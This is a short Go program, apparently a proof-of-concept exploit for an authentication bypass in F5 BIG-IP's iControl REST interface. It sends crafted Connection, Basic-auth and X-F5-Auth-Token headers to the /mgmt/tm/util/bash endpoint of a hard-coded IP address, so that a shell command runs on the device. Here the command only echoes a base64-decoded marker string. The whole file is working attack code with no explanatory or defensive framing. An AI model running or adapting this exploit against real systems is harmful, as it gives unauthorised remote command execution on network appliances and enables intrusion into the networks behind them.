package main

import (
	"fmt"
	"github.com/imroc/req/v3"
)

func main() {
	url := "http://139.162.180.108:7500"
	client := req.C()
	client.SetTimeout(10 * 1000)
	client.SetCommonRetryCount(3)
	client.EnableInsecureSkipVerify()
	headers := map[string]string{
		"Host":       "localhost",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		//"Connection":      "keep-alive, x-f5-auTh-tOKen, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd,X-F5-New-Authtok-Reqd,X-Forwarded-Server,X-Forwarded-Host",
		"Connection":      "keep-alive, x-f5-auTh-tOKen",
		"Authorization":   "Basic YWRtaW46",
		"X-F5-Auth-Token": "a",
		"Content-Type":    "application/json",
	}
	resp, _ := client.R().SetHeadersNonCanonical(headers).SetBody("{\"command\":\"run\",\"utilCmdArgs\":\"-c 'echo SnZQYURpdk9lVQ== | base64 -d'\"}").Post(url + "/mgmt/tm/util/bash")
	fmt.Println(resp.Dump())

}
